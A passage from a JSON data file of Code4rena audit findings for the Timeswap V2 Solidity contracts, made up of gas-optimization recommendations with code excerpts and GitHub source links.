param.maturity, address(this), TimeswapV2OptionPosition.Long1) + long1Amount;\n  \n  274:    uint256 shortBalanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Short) + shortAmount;\n  \n  293:    if (long0Amount != 0) Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long0), long0BalanceTarget);\n  \n  295:    if (long1Amount != 0) Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long1), long1BalanceTarget);\n  \n  297:    Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Short), shortBalanceTarget);\n  \n  393:    if (long0Amount != 0) long0BalanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long0) + long0Amount;\n  \n  397:    if (long1Amount != 0) long1BalanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long1) + long1Amount;\n  \n  411:    if (long0Amount != 0) Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long0), long0BalanceTarget);\n  \n  413:    if (long1Amount != 0) Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long1), long1BalanceTarget);\n  \n  444:    uint256 balanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Short) + shortAmount;\n  \n  461:    Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Short), balanceTarget);\n  \n  479:    uint256 balanceTarget = ITimeswapV2Option(optionPair).positionOf(\n  \n  511:    ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), param.isLong0ToLong1 ? TimeswapV2OptionPosition.Long0 : TimeswapV2OptionPosition.Long1),\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L189\n\n```solidity\npackages\\v2-option\\src\\libraries\\OptionFactory.sol:\n  28:     optionPair = ITimeswapV2OptionFactory(optionFactory).get(token0, token1);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/libraries/OptionFactory.sol#L28\n\n```solidity\npackages\\v2-pool\\src\\libraries\\PoolFactory.sol:\n  32:     poolPair = ITimeswapV2PoolFactory(poolFactory).get(optionPair);\n  \n  46:     poolPair = ITimeswapV2PoolFactory(poolFactory).get(optionPair);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/libraries/PoolFactory.sol#L32\n\n```solidity\npackages\\v2-option\\src\\TimeswapV2Option.sol:\n  128:    IERC20(token0).balanceOf(address(this)) + token0AndLong0Amount,\n  \n  129:    IERC20(token1).balanceOf(address(this)) + token1AndLong1Amount\n  \n  145:    if (token0AndLong0Amount != 0) Error.checkEnough(IERC20(token0).balanceOf(address(this)), currentProcess.balance0Target);\n  \n  148:    if (token1AndLong1Amount != 0) Error.checkEnough(IERC20(token1).balanceOf(address(this)), currentProcess.balance1Target);\n  \n  215:    param.isLong0ToLong1 ? IERC20(token0).balanceOf(address(this)) - token0AndLong0Amount : IERC20(token0).balanceOf(address(this)) + token0AndLong0Amount,\n  \n  216:    param.isLong0ToLong1 ? IERC20(token1).balanceOf(address(this)) + token1AndLong1Amount : IERC20(token1).balanceOf(address(this)) - token1AndLong1Amount\n  \n  172:    if (token0AndLong0Amount != 0) IERC20(token0).safeTransfer(param.token0To, token0AndLong0Amount);\n  \n  175:    if (token1AndLong1Amount != 0) IERC20(token1).safeTransfer(param.token1To, token1AndLong1Amount);\n  \n  220:    IERC20(param.isLong0ToLong1 ? token0 : token1).safeTransfer(param.tokenTo, param.isLong0ToLong1 ? token0AndLong0Amount : token1AndLong1Amount);\n  \n  259:    if (token0Amount != 0) IERC20(token0).safeTransfer(param.token0To, token0Amount);\n  \n  262:    if (token1Amount != 0) IERC20(token1).safeTransfer(param.token1To, token1Amount);\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L128\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24942",
      "title": "[G-23] Setting the _constructor_ to `payable`",
      "impact": "GAS",
      "content": "\nYou can cut out 10 opcodes in the creation-time EVM bytecode if you declare a constructor payable. Making the constructor payable eliminates the need for an initial check of ```msg.value == 0``` and saves ```13 gas``` on deployment with no security risks.\n\n8 results - 8 files:\n\n```solidity\npackages\\v2-option\\src\\NoDelegateCall.sol:\n  19:     constructor() {\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/NoDelegateCall.sol#L19\n\n\n```solidity\npackages\\v2-option\\src\\TimeswapV2Option.sol:\n  65:     constructor() NoDelegateCall() {\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L65\n\n\n```solidity\npackages\\v2-pool\\src\\NoDelegateCall.sol:\n  19:     constructor() {\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/NoDelegateCall.sol#L19\n\n\n```solidity\npackages\\v2-pool\\src\\TimeswapV2Pool.sol:\n  77:     constructor() NoDelegateCall() {\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L77\n\n\n```solidity\npackages\\v2-pool\\src\\TimeswapV2PoolFactory.sol:\n  37:     constructor(address chosenOwner, uint256 chosenTransactionFee, uint256 chosenProtocolFee) OwnableTwoSteps(chosenOwner) {\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2PoolFactory.sol#L37\n\n\n```solidity\npackages\\v2-pool\\src\\base\\OwnableTwoSteps.sol:\n  18:     constructor(address chosenOwner) {\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/base/OwnableTwoSteps.sol#L18\n\n\n```solidity\npackages\\v2-token\\src\\TimeswapV2LiquidityToken.sol:\n  36:     constructor(address chosenOptionFactory, address chosenPoolFactory) ERC1155(\"Timeswap V2 uint160 address\") {\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L36\n\n```solidity\npackages\\v2-token\\src\\TimeswapV2Token.sol:\n  41:     constructor(address chosenOptionFactory) ERC1155(\"Timeswap V2 address\") {\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L41\n\n\n\n**Recommendation:**\n\nSet the constructor to ```payable```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24941",
      "title": "[G-22] Use ``assembly`` to write _address storage values_",
      "impact": "GAS",
      "content": "\n2 results - 2 files:\n\n```solidity\npackages\\v2-pool\\src\\base\\OwnableTwoSteps.sol:\n  18     constructor(address chosenOwner) {\n  19:         owner = chosenOwner;```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/base/OwnableTwoSteps.sol#L19\n\n\n```solidity\npackages\\v2-token\\src\\TimeswapV2Token.sol:\n  41     constructor(address chosenOptionFactory) ERC1155(\"Timeswap V2 address\") {\n  42:           optionFactory = chosenOptionFactory;\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L42\n\n\n**Recommendation Code:**\n\n```diff\n  41     constructor(address chosenOptionFactory) ERC1155(\"Timeswap V2 address\") {\n- 42:           optionFactory = chosenOptionFactory;\n+                  assembly {                      \n+                      sstore(optionFactory.slot, chosenOptionFactory)\n+                  }                               \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24940",
      "title": "[G-21] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\nWhen using elements that are smaller than 32 bytes, your contracts gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html \n\nUse a larger size then downcast where needed.\n\n23 results - 4 files:\n```solidity\npackages\\v2-library\\src\\SafeCast.sol:\n  20:    result = uint16(value);\n\n  38:    result = uint160(value);\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/SafeCast.sol#L20\n\n```solidity\npackages\\v2-pool\\src\\TimeswapV2Pool.sol:\n  104:   return pools[strike][maturity].liquidity;\n\n  109:   return pools[strike][maturity].sqrtInterestRate;\n\n  114:   return pools[strike][maturity].liquidityPositions[owner].liquidity;\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L104\n\n```solidity\npackages\\v2-pool\\src\\libraries\\ConstantProduct.sol:\n  67:    liquidityAmount = getLiquidityGivenLong(rate, longAmount, !isAdd);\n\n  82:    liquidityAmount = getLiquidityGivenShort(rate, shortAmount, duration, !isAdd);\n\n  104:   liquidityAmount = getLiquidityGivenLong(rate, amount, !isAdd);\n\n  110:   liquidityAmount = getLiquidityGivenShort(rate, amount, duration, !isAdd);\n\n  142:   newRate = isAdd ? rate + deltaRate : rate - deltaRate;\n\n  174:   newRate = getNewSqrtInterestRateGivenLong(liquidity, rate, longAmount + (isAdd ? 0 : fees), isAdd);\n\n  206:   (newRate, deltaRate) = getNewSqrtInterestRateGivenShort(liquidity, rate, shortAmount + (isAdd ? 0 : fees), duration, isAdd);\n\n  260:   return FullMath.mulDiv(uint256(rate), longAmount, uint256(1) << 96, roundUp).toUint160();\n\n  269:   return FullMath.mulDiv(shortAmount, uint256(1) << 192, uint256(rate).unsafeMul(duration), roundUp).toUint160();\n\n  296:   return numerator.div(denominator2, true).toUint160();\n\n  316:   deltaRate = FullMath.mulDiv(shortAmount, uint256(1) << 192, denominator, !isAdd).toUint160();\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/libraries/ConstantProduct.sol#L67\n\n```solidity\npackages\\v2-pool\\src\\structs\\LiquidityPosition.sol:\n  66:    liquidityPosition.liquidity += liquidityAmount;\n\n  76:    liquidityPosition.liquidity -= liquidityAmount;\n\n  207:   pool.sqrtInterestRate = rate;\n\n  308:   liquidityAmount = param.delta.toUint160(),\n\n  398:   liquidityAmount = param.delta.toUint160(),\n\n  486:   param.delta.toUint160(),\n\n  572:   param.delta.toUint160(),\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/structs/LiquidityPosition.sol#L66\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24939",
      "title": "[G-20] Remove import ``forge-std/console.sol``",
      "impact": "GAS",
      "content": "\nIt's used to print the values of variables while running tests to help debug and see what's happening inside your contracts But since it's a development tool, it serves no purpose on mainnet. \n\n1 result - 1 file:\n\n```solidity\npackages\\v2-token\\src\\TimeswapV2Token.sol:\n  5: import \"forge-std/console.sol\"; \n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L5\n\n\nAlso, the following code block should be removed along with the removal of ``forge-std/console.sol``.\n\n```solidity\npackages/v2-token/src/TimeswapV2Token.sol:\n  109:             console.log(\"reaches right before mint in timeswapv2Tokne::mint\");\n```\n\n**Recommendation:**\n\nUse only for tests\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24938",
      "title": "[G-19] Save gas with the use of the import statement",
      "impact": "GAS",
      "content": "\nWith the import statement, it saves gas to specifically import only the parts of the contracts, not the complete ones.\n\n```solidity\npackages/v2-token/src/interfaces/IERC1155Enumerable.sol:\n\n6: import \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\";\n```\n\n**Description:**\n\nSolidity code is also cleaner in another way that might not be noticeable: the struct Point. We were importing it previously with global import but not using it. The Point struct `polluted the source code` with an unnecessary object we were not using because we did not need it. \n\nThis was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.\n\n**Recommendation:**\n\n`import {contract1 , contract2} from \"filename.sol\";`\n\nA good example from the ArtGobblers project;\n\nimport {Owned} from \"solmate/auth/Owned.sol\";\n\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\n\nimport {LibString} from \"solmate/utils/LibString.sol\";\n\nimport {MerkleProofLib} from \"solmate/utils/MerkleProofLib.sol\";\n\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n\nimport {ERC1155, ERC1155TokenReceiver} from \"solmate/tokens/ERC1155.sol\";\n\nimport {toWadUnsafe, toDaysWadUnsafe} from \"solmate/utils/SignedWadMath.sol\";\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24937",
      "title": "[G-18] OpenZeppelin's ReentrancyGuard contract is gas-optimized",
      "impact": "GAS",
      "content": "\n```solidity\npackages/v2-pool/src/libraries/ReentrancyGuard.sol:\n  11:     /// @dev The initial state which must be change to NOT_ENTERED when first interacting.\n  12:     uint96 internal constant NOT_INTERACTED = 0;\n  13: \n  14:     /// @dev The initial and ending state of balanceTarget in the Option struct.\n  15:     uint96 internal constant NOT_ENTERED = 1;\n  16: \n  17:     /// @dev The state where the contract is currently being interacted with.\n  18:     uint96 internal constant ENTERED = 2;\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/libraries/ReentrancyGuard.sol#L12-L18\n\n\nI recommend using the gas-optimized OpenZeppelin ReentrancyGuard.sol contract.\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24936",
      "title": "[G-17] Using Openzeppelin Ownable2Step.sol is gas efficient",
      "impact": "GAS",
      "content": "\nThe project makes secure Owner changes with OwnableTwoStep.\n\nThe project's `acceptOwner()` function:\n\n```solidity\npackages\\v2-pool\\src\\base\\OwnableTwoSteps.sol:\n  34      /// @inheritdoc IOwnableTwoSteps\n  35:     function acceptOwner() external override {\n  36:         msg.sender.checkIfPendingOwner(pendingOwner);\n  37: \n  38:         owner = msg.sender;\n  39:         delete pendingOwner;\n  40: \n  41:         emit AcceptOwner(msg.sender);\n  42:     }\n  43  }\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/base/OwnableTwoSteps.sol#L35-L43\n\nHowever, I recommend using the more gas-optimized Openzeppelin in Ownable2Step.sol.\n\nOpenzeppelin acceptOwner() function:\n\n```solidity\nfunction acceptOwnership() public virtual {\n        address sender = _msgSender();\n        require(pendingOwner() == sender, \"Ownable2Step: caller is not the new owner\");\n        _transferOwnership(sender);\n    }\n```\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24935",
      "title": "[G-16] Using UniswapV3 ``mulDiv`` function is gas-optimized",
      "impact": "GAS",
      "content": "\n```solidity\npackages/v2-library/src/FullMath.sol:\n  180      /// @return result The result.\n  181:     function mulDiv(uint256 multiplicand, uint256 multiplier, uint256 divisor, bool roundUp) internal pure returns (uint256 result) {\n  182         (uint256 product0, uint256 product1) = mul512(multiplicand, multiplier);\n  183 \n  184         // Handle non-overflow cases, 256 by 256 division\n```\n\nReference: https://github.com/Uniswap/v3-core/blob/412d9b236a1e75a98568d49b1aeb21e3a1430544/contracts/libraries/FullMath.sol#L14\n\nReference: https://xn--2-umb.com/21/muldiv/\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24934",
      "title": "[G-15] ``>=`` costs less gas than ``>``",
      "impact": "GAS",
      "content": "\nThe compiler uses opcodes GT and ISZERO for solidity code that uses >, but only requires LT for >=, which saves 3 gas\n\n4 results - 2 files:\n\n```solidity\npackages\\v2-library\\src\\Math.sol:\n  89:         return value1 < value2 ? value1 : value2;\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/Math.sol#L89\n\n```solidity\npackages\\v2-library\\src\\StrikeConversion.sol:\n  27:         return strike > type(uint128).max ? (toOne ? convert(amount, strike, true, roundUp) : amount) : (toOne ? amount : convert(amount, strike, false, roundUp));\n\n  36:         return strike > type(uint128).max ? amount0 + convert(amount1, strike, false, roundUp) : amount1 + convert(amount0, strike, true, roundUp);\n\n  48:             strike > type(uint128).max\n  49                 ? (zeroToOne ? convert(base - amount, strike, true, roundUp) : base - convert(amount, strike, false, !roundUp))\n  50                 : (zeroToOne ? base - convert(amount, strike, true, !roundUp) : convert(base - amount, strike, false, roundUp));\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/StrikeConversion.sol#L27\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24933",
      "title": "[G-14] Sort Solidity operations using short-circuit mode",
      "impact": "GAS",
      "content": "\nShort-circuiting is a solidity contract development model that uses ```OR/AND``` logic to sequence different cost operations. It puts low gas cost operations in the front and high gas cost operations in the back, so that if the front is low, if the cost operation is feasible, you can skip (short-circuit) the subsequent high-cost Ethereum virtual machine operation.\n\n```\n//f(x) is a low gas cost operation \n//g(y) is a high gas cost operation \n\n//Sort operations with different gas costs as follows \nf(x) || g(y) \nf(x) && g(y)\n```\n3 results - 3 files:\n```solidity\npackages\\v2-pool\\src\\libraries\\ConstantProduct.sol:\n  298:    if (product.div(longAmount, false) != rate || product >= numerator) revert NotEnoughLiquidityToBorrow();\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/libraries/ConstantProduct.sol#L298\n\n```solidity\npackages\\v2-library\\src\\CatchError.sol:\n  15:     if ((length - 4) % 32 == 0 && bytes4(reason) == selector) return BytesLib.slice(reason, 4, length - 4);\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/CatchError.sol#L15\n\n```solidity\npackages\\v2-library\\src\\FullMath.sol:\n  68:     if (subtrahend1 > minuend1 || (subtrahend1 == minuend1 && subtrahend0 > minuend0)) revert SubUnderflow(minuend0, minuend1, subtrahend0, subtrahend1);\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/FullMath.sol#L68\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24932",
      "title": "[G-13] Use nested if and, avoid multiple check combinations",
      "impact": "GAS",
      "content": "\nUsing nested is cheaper than using && multiple check combinations. There are more advantages, such as easier to read code and better coverage reports.\n\n19 results - 9 files:\n\n```solidity\npackages\\v2-library\\src\\CatchError.sol:\n  15:    if ((length - 4) % 32 == 0 && bytes4(reason) == selector) return BytesLib.slice(reason, 4, length - 4);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/CatchError.sol#L15\n\n```solidity\npackages\\v2-library\\src\\FullMath.sol:\n  257:   if (roundUp && mulmod(multiplicand, multiplier, divisor) != 0) result++;\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/FullMath.sol#L257\n\n```solidity\npackages\\v2-library\\src\\Math.sol:\n  51:    if (roundUp && dividend % divisor != 0) quotient++;\n\n  62:    if (roundUp && dividend % (1 << divisorBit) != 0) quotient++;\n \n  81:    if (roundUp && value % result != 0) result++;\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/Math.sol#L51\n\n```solidity\npackages\\v2-option\\src\\structs\\Param.sol:\n  111:   if (param.amount0 == 0 && param.amount1 == 0) Error.zeroInput();\n\n  124:   if (param.amount0 == 0 && param.amount1 == 0) Error.zeroInput();\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/structs/Param.sol#L111\n\n```solidity\npackages\\v2-pool\\src\\TimeswapV2Pool.sol:\n  167:   if (long0Fees == 0 && long1Fees == 0 && shortFees == 0) Error.zeroInput();\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L167\n\n```solidity\npackages\\v2-pool\\src\\libraries\\ConstantProduct.sol:\n  411:   if (a11 == 0 && a01.unsafeAdd(a10) >= a01) {\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/libraries/ConstantProduct.sol#L411\n\n```solidity\npackages\\v2-pool\\src\\structs\\Param.sol:\n  136:   if (param.long0Requested == 0 && param.long1Requested == 0 && param.shortRequested == 0 && param.strike == 0) Error.zeroInput();\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/structs/Param.sol#L136\n\n```solidity\npackages\\v2-token\\src\\base\\ERC1155Enumerable.sol:\n  60:    if (_idTotalSupply[id] == 0 && _additionalConditionAddTokenToAllTokensEnumeration(id)) _addTokenToAllTokensEnumeration(id);\n\n  64:    if (to != address(0) && to != from) {\n  \n  65:    if (balanceOf(to, id) == 0 && _additionalConditionAddTokenToOwnerEnumeration(to, id)) _addTokenToOwnerEnumeration(to, id);\n\n  94:    if (_idTotalSupply[id] == 0 && _additionalConditionRemoveTokenFromAllTokensEnumeration(id)) _removeTokenFromAllTokensEnumeration(id);\n\n  98:    if (from != address(0) && from != to) {\n  \n  99:    if (balanceOf(from, id) == 0 && _additionalConditionRemoveTokenFromOwnerEnumeration(from, id)) _removeTokenFromOwnerEnumeration(from, id);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/base/ERC1155Enumerable.sol#L60\n\n```solidity\npackages\\v2-token\\src\\structs\\Param.sol:\n  121:   if (param.long0Amount == 0 && param.long1Amount == 0 && param.shortAmount == 0) Error.zeroInput();\n\n  128:   if (param.long0Amount == 0 && param.long1Amount == 0 && param.shortAmount == 0) Error.zeroInput();\n\n  149:   if (param.long0FeesDesired == 0 && param.long1FeesDesired == 0 && param.shortFeesDesired == 0) Error.zeroInput();\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/structs/Param.sol#L121\n\n**Recomendation Code:**\n\n```diff\nprotocol\\contracts\\plugins\\aave\\StaticATokenLM.sol#L422:\n- 149:   if (param.long0FeesDesired == 0 && param.long1FeesDesired == 0 && param.shortFeesDesired == 0) Error.zeroInput();\n+           if (param.long0FeesDesired == 0) {\n+               if (param.long1FeesDesired == 0) {\n+                   if (param.shortFeesDesired == 0) {\n+                       Error.zeroInput();\n+\t }\n+               }                                   \n+           }                                     \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24931",
      "title": "[G-12] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "\n> Solidity 0.8.10 has a useful change that reduced gas costs of external calls which expect a return value. \n> \n> In 0.8.15 the conditions necessary for inlining are relaxed. Benchmarks show that the change significantly decreases the bytecode size (which impacts the deployment cost) while the effect on the runtime gas usage is smaller.\n> \n> In 0.8.17 prevent the incorrect removal of storage writes before calls to Yul functions that conditionally terminate the external EVM call; Simplify the starting offset of zero-length operations to zero. More efficient overflow checks for multiplication.\n\nThe version of 70 contracts included in the scope is ``0.8.8``. I recommend that you upgrade the versions of all contracts in scope to the latest version of robustness, '0.8.17’.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24930",
      "title": "[G-11] Move owner checks to a modifier for gas efficant",
      "impact": "GAS",
      "content": "\nIt's better to use a modifier for simple owner checks for an easier inspection of functions. This is also more gas efficient as it does not control with external call.\n\n**The part where ``owner`` is defined:**\n\n```solidity\npackages/v2-library/src/Ownership.sol:\n  22:     function checkIfOwner(address owner) internal view {\n  23          if (msg.sender != owner) revert NotTheOwner(msg.sender, owner);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/Ownership.sol#L22-L23\n\n\n2 results 2 files:\n\n```solidity\npackages/v2-pool/src/TimeswapV2Pool.sol:\n  189:         ITimeswapV2PoolFactory(poolFactory).owner().checkIfOwner();\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L189\n\n```solidity\npackages/v2-pool/src/base/OwnableTwoSteps.sol:\n  23      function setPendingOwner(address chosenPendingOwner) external override {\n  24:         Ownership.checkIfOwner(owner);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/base/OwnableTwoSteps.sol#L23-L24\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24929",
      "title": "[G-10] Gas overflow during iteration (DoS)",
      "impact": "GAS",
      "content": "\nEach iteration of the cycle requires a gas flow. A moment may come when more gas is required than it is allocated to record one block. In this case, all iterations of the loop will fail.\n\n```diff\npackages/v2-option/src/structs/Process.sol:\n  32      /// @param isAddToken1 IsAddToken1 if true. IsSubToken0 if false\n  33:     function updateProcess(Process[] storage processing, uint256 token0Amount, uint256 token1Amount, bool isAddToken0, bool isAddToken1) internal {\n+              require(processing.length.length() < maxProcessingLengt, \"max length\");\n  34:         for (uint256 i; i < processing.length; ) {\n  35:             Process storage process = processing[i];\n  36: \n  37:             if (token0Amount != 0) process.balance0Target = isAddToken0 ? process.balance0Target + token0Amount : process.balance0Target - token0Amount;\n  38: \n  39:             if (token1Amount != 0) process.balance1Target = isAddToken1 ? process.balance1Target + token1Amount : process.balance1Target - token1Amount;\n  40: \n  41:             unchecked {\n  42:                 i++;\n  43:             }\n  44:         }\n  45:      }\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/structs/Process.sol#L33-L45\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24928",
      "title": "[G-09] Avoid using external call",
      "impact": "GAS",
